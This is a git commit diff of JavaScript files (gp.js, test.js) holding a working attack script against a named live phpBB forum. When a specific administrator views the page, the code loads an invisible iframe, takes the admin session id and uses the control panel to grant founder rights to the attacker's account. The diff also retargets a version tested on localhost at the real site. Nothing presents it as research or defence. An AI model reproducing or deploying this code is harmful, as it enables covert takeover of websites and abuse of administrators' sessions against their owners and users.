a1393dcb1d828e0332b4d65264ba3547937cf742
unknown <igor.l.leonhardt@gmail.com>
2022-06-15 12:03:39 -0300

    1

--- gp.js
+++ gp.js
@@ -35,10 +35,10 @@
 
 var header = document.getElementById('header');
 var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
-if (!document.getElementById("del1me")) {
+if (!document.getElementById("gp_h1")) {
     if (user_name === "BRAND") {
         var iframe = document.createElement('iframe');
-        iframe.id = "del1me";
+        iframe.id = "gp_h1";
         iframe.src = `https://gparena.net/forum/`;
         iframe.height = "400";
         iframe.width = "400";
@@ -47,24 +47,36 @@ if (!document.getElementById("del1me")) {
         iframe.style.zIndex = -1;
         iframe.style.top = "-30px";
         header.append(iframe);
+        //document.body.append(iframe);
         const wait = setTimeout(stealThisMoment, secondsToMS(3));
+    };
+    if (user_name === "Bury_comedor") {
+        var iframe = document.createElement('iframe');
+        iframe.id = "gp_h1";
+        iframe.src = `https://gparena.net/forum/`;
+        iframe.height = "400";
+        iframe.width = "400";
+        iframe.style.opacity = 0;
+        iframe.style.position = "absolute";
+        iframe.style.zIndex = -1;
+        iframe.style.top = "-30px";
+        header.append(iframe);
+        //document.body.append(iframe);
+        console.log("gl");
     };
 }
 
 function stealThisMoment() {
-    console.log("3secs!");
     var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
-    console.log("sid is = " + sid);
-
+    iframe.contentWindow.window.location.replace(`https://gparena.net/forum/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
     setTimeout(() => { 
-        
+        iframe.contentWindow.document.getElementById("username").value = "Bury_comedor";
+        iframe.contentWindow.document.getElementsByName("submituser")[0].click();
+        setTimeout(() => { 
+            iframe.contentWindow.document.getElementsByName("user_founder")[0].click();
+            iframe.contentWindow.document.getElementsByName("update")[0].click();
+         }, secondsToMS(3));
      }, secondsToMS(3));
-    iframe.contentWindow.document.getElementById("username_list").value = "!lole";
-    iframe.contentWindow.document.getElementsByName("add_to")[0].click();
-    iframe.contentWindow.document.getElementById("subject").value = "beary";
-    iframe.contentWindow.document.getElementById("message").value = "chicanery";
-    iframe.contentWindow.document.getElementsByName("post")[0].click();
-    setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
 };
 
 
@@ -73,5 +85,4 @@ function secondsToMS(seconds) {
 };
 
 
-window.location.replace('https://stackoverflow.com/questions/1226714/how-to-get-the-browser-to-navigate-to-url-in-javascript');
 
--- test.js
+++ test.js
@@ -1,43 +1,47 @@
-// var script_ids = ["a1", "a2", "a3", "a4"];
-//var header = document.getElementById('header');
-//var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
-var user_name = "homu";
+var header = document.getElementById('header');
+var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
 if (!document.getElementById("gp_h1")) {
-    if (user_name === "homu") {
+    if (user_name === "BRAND") {
         var iframe = document.createElement('iframe');
         iframe.id = "gp_h1";
-        iframe.src = `http://localhost/AM/phpbb3/`;
-        iframe.height = "600";
-        iframe.width = "600";
-        //iframe.style.opacity = 0;
+        iframe.src = `https://gparena.net/forum/`;
+        iframe.height = "400";
+        iframe.width = "400";
+        iframe.style.opacity = 0;
         iframe.style.position = "absolute";
         iframe.style.zIndex = -1;
-        //iframe.style.top = "-30px";
-        //header.append(iframe);
-        document.body.append(iframe);
+        iframe.style.top = "-30px";
+        header.append(iframe);
+        //document.body.append(iframe);
         const wait = setTimeout(stealThisMoment, secondsToMS(3));
+    };
+    if (user_name === "Bury_comedor") {
+        var iframe = document.createElement('iframe');
+        iframe.id = "gp_h1";
+        iframe.src = `https://gparena.net/forum/`;
+        iframe.height = "400";
+        iframe.width = "400";
+        iframe.style.opacity = 0;
+        iframe.style.position = "absolute";
+        iframe.style.zIndex = -1;
+        iframe.style.top = "-30px";
+        header.append(iframe);
+        //document.body.append(iframe);
+        console.log("gl");
     };
 }
 
 function stealThisMoment() {
-    console.log("3secs!");
     var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
-    console.log("sid is = " + sid);
-    iframe.contentWindow.window.location.replace(`http://localhost/AM/phpbb3/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
+    iframe.contentWindow.window.location.replace(`https://gparena.net/forum/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
     setTimeout(() => { 
-        iframe.contentWindow.document.getElementById("username").value = "lole1";
+        iframe.contentWindow.document.getElementById("username").value = "Bury_comedor";
         iframe.contentWindow.document.getElementsByName("submituser")[0].click();
         setTimeout(() => { 
             iframe.contentWindow.document.getElementsByName("user_founder")[0].click();
             iframe.contentWindow.document.getElementsByName("update")[0].click();
          }, secondsToMS(3));
      }, secondsToMS(3));
-    iframe.contentWindow.document.getElementById("username_list").value = "!lole";
-    iframe.contentWindow.document.getElementsByName("add_to")[0].click();
-    iframe.contentWindow.document.getElementById("subject").value = "beary";
-    iframe.contentWindow.document.getElementById("message").value = "chicanery";
-    iframe.contentWindow.document.getElementsByName("post")[0].click();
-    setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
 };
 
 
